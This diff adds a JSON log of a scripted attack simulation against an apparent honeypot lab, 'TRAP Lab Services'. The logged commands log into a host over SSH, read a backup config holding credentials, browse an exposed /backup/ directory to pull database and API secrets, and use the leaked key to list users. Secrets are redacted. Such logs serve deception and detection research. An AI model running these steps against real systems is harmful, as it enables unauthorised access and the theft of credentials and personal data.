@@ -1,0 +1,93 @@
+[
+  {
+    "time": "2026-10-10T13:42:01.084433+00:00",
+    "command": "systemctl restart trap-log-sync",
+    "exit_code": 0,
+    "stdout": "",
+    "stderr": ""
+  },
+  {
+    "time": "2026-10-10T13:42:02.681280+00:00",
+    "command": "ip netns exec trap-attacker ip addr add 192.168.56.154/24 dev trap-in",
+    "exit_code": 0,
+    "stdout": "",
+    "stderr": ""
+  },
+  {
+    "time": "2026-10-10T13:42:04.632089+00:00",
+    "command": "ip netns exec trap-attacker python3 -c 'import socket,time\nfor i in range(6):\n s=socket.socket();s.settimeout(4);s.bind(('\"'\"'192.168.56.154'\"'\"',0));s.connect(('\"'\"'192.168.56.10'\"'\"',22));s.recv(256);s.close();time.sleep(.2)'",
+    "exit_code": 0,
+    "stdout": "",
+    "stderr": ""
+  },
+  {
+    "time": "2026-10-10T13:42:06.728371+00:00",
+    "command": "ip netns exec trap-attacker python3 -c 'import socket,paramiko,time,json\ns=socket.socket();s.bind(('\"'\"'192.168.56.154'\"'\"',0));s.settimeout(8);s.connect(('\"'\"'192.168.56.10'\"'\"',22));c=paramiko.SSHClient();c.set_missing_host_key_policy(paramiko.AutoAddPolicy());c.connect('\"'\"'192.168.56.10'\"'\"',username='\"'\"'sysadmin'\"'\"',password='\"'\"'[REDACTED]'\"'\"',sock=s,look_for_keys=False,allow_agent=False);ch=c.invoke_shell()\nfor cmd in ['\"'\"'hostname'\"'\"', '\"'\"'cat notes.txt'\"'\"', '\"'\"'cat /opt/backup/backup.conf'\"'\"']:\n ch.send(cmd+'\"'\"'\\n'\"'\"');time.sleep(.5);out='\"'\"''\"'\"'\n while ch.recv_ready():out+=ch.recv(65535).decode(errors='\"'\"'replace'\"'\"')\n print(json.dumps({'\"'\"'command'\"'\"':cmd,'\"'\"'output'\"'\"':out}))\nch.send('\"'\"'exit\\n'\"'\"');time.sleep(.2);c.close()\n'",
+    "exit_code": 0,
+    "stdout": "{\"command\": \"hostname\", \"output\": \"\\r\\nThe programs included with the Debian GNU/Linux system are free software;\\r\\nthe exact distribution terms for each program are described in the\\r\\nindividual files in /usr/share/doc/*/copyright.\\r\\n\\r\\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\\r\\npermitted by applicable law.\\r\\n\\u001b[4hsysadmin@trap-backup-01:~$ hostname\\r\\n\\u001b[4ltrap-backup-01\\r\\n\\u001b[4hsysadmin@trap-backup-01:~$ \"}\n{\"command\": \"cat notes.txt\", \"output\": \"cat notes.txt\\r\\n\\u001b[4l- rotate DB password (see /opt/backup/backup.conf)\\r\\n- old dumps are in /var/backups/db, clean up before audit\\r\\n- vpn: 10.20.0.194\\r\\n\\u001b[4hsysadmin@trap-backup-01:~$ \"}\n{\"command\": \"cat /opt/backup/backup.conf\", \"output\": \"cat /opt/backup/backup.conf\\r\\n\\u001b[4l# TRAP Lab Services database backup\\r\\nDB_HOST=10.20.0.148\\r\\nDB_NAME=acme_erp\\r\\nDB_USER=root\\r\\nDB_PASS=[REDACTED]\\r\\nDUMP_DIR=/var/backups/db\\r\\nKEEP_DAYS=7\\r\\n\\u001b[4hsysadmin@trap-backup-01:~$ \"}\n",
+    "stderr": ""
+  },
+  {
+    "time": "2026-10-10T13:42:08.397360+00:00",
+    "command": "systemctl restart trap-log-sync",
+    "exit_code": 0,
+    "stdout": "",
+    "stderr": ""
+  },
+  {
+    "time": "2026-10-10T13:42:11.503889+00:00",
+    "command": "ip netns exec trap-attacker ip addr add 192.168.56.155/24 dev trap-in",
+    "exit_code": 0,
+    "stdout": "",
+    "stderr": ""
+  },
+  {
+    "time": "2026-10-10T13:42:11.530775+00:00",
+    "command": "ip netns exec trap-attacker curl --interface 192.168.56.155 -skS -i --max-time 5 http://192.168.56.10/.htpasswd",
+    "exit_code": 0,
+    "stdout": "HTTP/1.1 403 Forbidden\nServer: nginx/1.24.0 (Ubuntu)\nDate: Sat, 10 Oct 2026 13:42:11 GMT\nContent-Type: text/html; charset=iso-8859-1\nContent-Length: 318\nConnection: keep-alive\n\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">\n<html><head>\n<title>403 Forbidden</title>\n</head><body>\n<h1>Forbidden</h1>\n<p>You don't have permission to access this resource.</p>\n<hr>\n<address>Apache/2.4.68 (Debian) Server at 192.168.56.10 Port 80</address>\n</body></html>\n",
+    "stderr": ""
+  },
+  {
+    "time": "2026-10-10T13:42:11.968867+00:00",
+    "command": "ip netns exec trap-attacker curl --interface 192.168.56.155 -skS -i --max-time 5 'http://192.168.56.10/?round5=postboot'",
+    "exit_code": 0,
+    "stdout": "HTTP/1.1 200 OK\nServer: nginx/1.24.0 (Ubuntu)\nDate: Sat, 10 Oct 2026 13:42:11 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 322\nConnection: keep-alive\nSet-Cookie: PHPSESSID=[REDACTED]\n\n<!doctype html><html><head><meta charset=\"utf-8\"><title>TRAP Lab Services</title></head><body style=\"font-family:sans-serif;max-width:720px;margin:60px auto\"><h1>TRAP Lab Services</h1><p>Customer portal is under scheduled maintenance. Please try again later.</p><p style=\"color:#888\">&copy; 2026 trap.lab</p></body></html>",
+    "stderr": ""
+  },
+  {
+    "time": "2026-10-10T13:42:11.995467+00:00",
+    "command": "ip netns exec trap-attacker curl --interface 192.168.56.155 -skS -i --max-time 5 -A TRAP-Round5-Rabbit -b /var/lib/trap/round5-20261010T132320Z/postboot.cookies -c /var/lib/trap/round5-20261010T132320Z/postboot.cookies http://192.168.56.10/robots.txt",
+    "exit_code": 0,
+    "stdout": "HTTP/1.1 200 OK\nServer: nginx/1.24.0 (Ubuntu)\nDate: Sat, 10 Oct 2026 13:42:11 GMT\nContent-Type: text/plain; charset=utf-8\nContent-Length: 73\nConnection: keep-alive\nSet-Cookie: PHPSESSID=[REDACTED]\n\nUser-agent: *\nDisallow: /backup/\nDisallow: /api/docs\nDisallow: /cgi-bin/\n",
+    "stderr": ""
+  },
+  {
+    "time": "2026-10-10T13:42:12.033330+00:00",
+    "command": "ip netns exec trap-attacker curl --interface 192.168.56.155 -skS -i --max-time 5 -A TRAP-Round5-Rabbit -b /var/lib/trap/round5-20261010T132320Z/postboot.cookies -c /var/lib/trap/round5-20261010T132320Z/postboot.cookies http://192.168.56.10/backup/",
+    "exit_code": 0,
+    "stdout": "HTTP/1.1 200 OK\nServer: nginx/1.24.0 (Ubuntu)\nDate: Sat, 10 Oct 2026 13:42:12 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 632\nConnection: keep-alive\n\n<html>\n<head><title>Index of /backup/</title></head>\n<body>\n<h1>Index of /backup/</h1><hr><pre><a href=\"../\">../</a>\n<a href=\"README.txt\">README.txt</a>                                         22-Sep-2026 02:16                 216\n<a href=\"config.json\">config.json</a>                                        22-Sep-2026 02:55                 328\n<a href=\"db_2026-10-09.sql.gz\">db_2026-10-09.sql.gz</a>                               22-Sep-2026 02:27             7340903\n<a href=\"site-2026-10-03.tar.gz\">site-2026-10-03.tar.gz</a>                             22-Sep-2026 02:54             7876584\n</pre><hr></body>\n</html>\n",
+    "stderr": ""
+  },
+  {
+    "time": "2026-10-10T13:42:12.056688+00:00",
+    "command": "ip netns exec trap-attacker curl --interface 192.168.56.155 -skS -i --max-time 5 -A TRAP-Round5-Rabbit -b /var/lib/trap/round5-20261010T132320Z/postboot.cookies -c /var/lib/trap/round5-20261010T132320Z/postboot.cookies http://192.168.56.10/backup/config.json",
+    "exit_code": 0,
+    "stdout": "HTTP/1.1 200 OK\nServer: nginx/1.24.0 (Ubuntu)\nDate: Sat, 10 Oct 2026 13:42:12 GMT\nContent-Type: application/json\nContent-Length: 328\nConnection: keep-alive\n\n{\n  \"app\": \"acme-portal\",\n  \"environment\": \"production\",\n  \"database\": {\"host\": \"10.20.0.75\", \"name\": \"acme_erp\", \"user\": \"portal_rw\", \"password\": \"[REDACTED]\"},\n  \"api\": {\"base_url\": \"https://trap.lab/api/v1/\", \"key\": \"[REDACTED]\"},\n  \"backup\": {\"owner\": \"sysadmin\", \"schedule\": \"0 2 * * *\"}\n}\n",
+    "stderr": ""
+  },
+  {
+    "time": "2026-10-10T13:42:12.084518+00:00",
+    "command": "ip netns exec trap-attacker curl --interface 192.168.56.155 -skS -i --max-time 5 -A TRAP-Round5-Rabbit -b /var/lib/trap/round5-20261010T132320Z/postboot.cookies -c /var/lib/trap/round5-20261010T132320Z/postboot.cookies -H 'X-API-Key: [REDACTED]' http://192.168.56.10/api/v1/users",
+    "exit_code": 0,
+    "stdout": "HTTP/1.1 200 OK\nServer: nginx/1.24.0 (Ubuntu)\nDate: Sat, 10 Oct 2026 13:42:12 GMT\nContent-Type: application/json\nContent-Length: 1526\nConnection: keep-alive\n\n{\n  \"items\": [\n    {\n      \"id\": 1000,\n      \"name\": \"Narong Kongkaew\",\n      \"email\": \"nkongkaew@trap.lab\",\n      \"role\": \"manager\"\n    },\n    {\n      \"id\": 1001,\n      \"name\": \"Kanokwan Srisuk\",\n      \"email\": \"ksrisuk@trap.lab\",\n      \"role\": \"manager\"\n    },\n    {\n      \"id\": 1002,\n      \"name\": \"Siriporn Kaewmanee\",\n      \"email\": \"skaewmanee@trap.lab\",\n      \"role\": \"staff\"\n    },\n    {\n      \"id\": 1003,\n      \"name\": \"Sakda Jaidee\",\n      \"email\": \"sjaidee@trap.lab\",\n      \"role\": \"staff\"\n    },\n    {\n      \"id\": 1004,\n      \"name\": \"Ploy Boonmee\",\n      \"email\": \"pboonmee@trap.lab\",\n      \"role\": \"staff\"\n    },\n    {\n      \"id\": 1005,\n      \"name\": \"Kanokwan Thongdee\",\n      \"email\": \"kthongdee@trap.lab\",\n      \"role\": \"manager\"\n    },\n    {\n      \"id\": 1006,\n      \"name\": \"Wanida Meesuk\",\n      \"email\": \"wmeesuk@trap.lab\",\n      \"role\": \"staff\"\n    },\n    {\n      \"id\": 1007,\n      \"name\": \"Ekkachai Chaiyaporn\",\n      \"email\": \"echaiyaporn@trap.lab\",\n      \"role\": \"admin\"\n    },\n    {\n      \"id\": 1008,\n      \"name\": \"Suda Suwannarat\",\n      \"email\": \"ssuwannarat@trap.lab\",\n      \"role\": \"staff\"\n    },\n    {\n      \"id\": 1009,\n      \"name\": \"Thanakorn Saetang\",\n      \"email\": \"tsaetang@trap.lab\",\n      \"role\": \"admin\"\n    },\n    {\n      \"id\": 1010,\n      \"name\": \"Jiraporn Inthasorn\",\n      \"email\": \"jinthasorn@trap.lab\",\n      \"role\": \"staff\"\n    },\n    {\n      \"id\": 1011,\n      \"name\": \"Kanokwan Kaewmanee\",\n      \"email\": \"kkaewmanee@trap.lab\",\n      \"role\": \"manager\"\n    }\n  ],\n  \"total\": 12\n}",
+    "stderr": ""
+  },
+  {
+    "time": "2026-10-10T13:42:13.120020+00:00",
+    "command": "systemctl restart trap-log-sync",
+    "exit_code": 0,
+    "stdout": "",
+    "stderr": ""
+  }
+]
